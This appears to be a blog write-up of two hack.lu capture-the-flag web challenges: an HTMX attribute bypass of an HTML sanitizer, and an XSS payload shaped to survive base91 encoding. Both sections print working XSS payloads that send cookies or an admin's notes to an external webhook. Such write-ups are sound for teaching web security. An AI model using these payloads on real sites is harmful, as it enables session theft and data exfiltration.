---
layout: post
title: "hack.lu web challs"
---

# awesomenotes1
The server has a filter for html:
```
let safe = ammonia::Builder::new()
    .tags(hashset!["h1", "p", "div"])
    .add_generic_attribute_prefixes(&["hx-"])
    .clean(&body)
    .to_string();
```

Seems like we can use HTMX attributes, which start with `hx`. `hx-on::load` fires whenever the element loads and allows JS execution:

```
<h1 hx-on::load="new Image().src='https://webhook.site/5dd7dcdd-930d-4bfe-8384-9115bcd513c9/'+document.cookie">pwned</h1>
```

This reveals the flag: `flag{C3r34l_1s_s0up_l1k3_1f_4gr33}`.

# based_encoding

The server allows us to create notes of arbitrary strings, but they get encoded into base91 format (weird).

```
@app.route("/create", methods=["GET", "POST"])
def create():
    if not session:
        flash("Please log in")
        return redirect("/login")
    if request.method == "GET":
        return render_template("create.html", logged_out=False)
    elif request.method == "POST":
        if not request.form["text"]:
            return "Missing text"
        text = request.form["text"]
        if len(text) > 1000:
            flash("Too long!")
            return redirect("/create")
        encoded = based91.encode(text.encode() if not (re.match(r"^[a-f0-9]+$", text) and len(text) % 2 == 0) else bytes.fromhex(text))
        encoding_id = create_encoding(session["username"], encoded)
        
        return redirect(f"/e/{encoding_id}")
```

So we can get XSS if we can craft a payload that uses the allowed characters in the base91 format. Specifically, we need to find a string `x` such that `based91.encode(x)` results in a "useful" XSS. In this case, "useful" means "leaks the admin's notes". Note that if the provided string is in hex format, it will be converted to raw bytes.

The exploit will 1) open a new tab to `/`, to retrieve the links to all the admin's notes, and 2) for each link, fetch its contents and send it to a webhook. There are a few restrictions though: you can't have spaces, periods, or dashes (all are not valid base91).

For spaces, you can just use comments like `/**/`. For the literal period and dash characters, you can use `String["fromCharCode"](0x2e)` and `String["fromCharCode"](0x2d)`, respectively (these are needed for the webhook URL). Finally, to access object fields (like `window.open`), you can just use object key syntax: `window['open'](...)`.

The final exploit is here (before being decoded):
```
<script>
let/**/wh="https://webhook"+String["fromCharCode"](0x2e)+"site/5dd7dcdd"+String["fromCharCode"](0x2d)+"930d"+String["fromCharCode"](0x2d)+"4bfe"+String["fromCharCode"](0x2d)+"8384"+String["fromCharCode"](0x2d)+"9115bcd513c9/";let/**/w=window["open"]("/");w["onload"]=()=>{let/**/l=w["document"]["getElementsByTagName"]("a");for(let/**/link/**/of/**/l){ fetch(link["href"])["then"](x=>x["text"]())["then"](x=>{new/**/Image()["src"]=wh+btoa(x)}) }}
</script>AAAAAAAA
```

Flag: `flag{bas3d_enc0dings_str1p_off_ur_sk1n}`

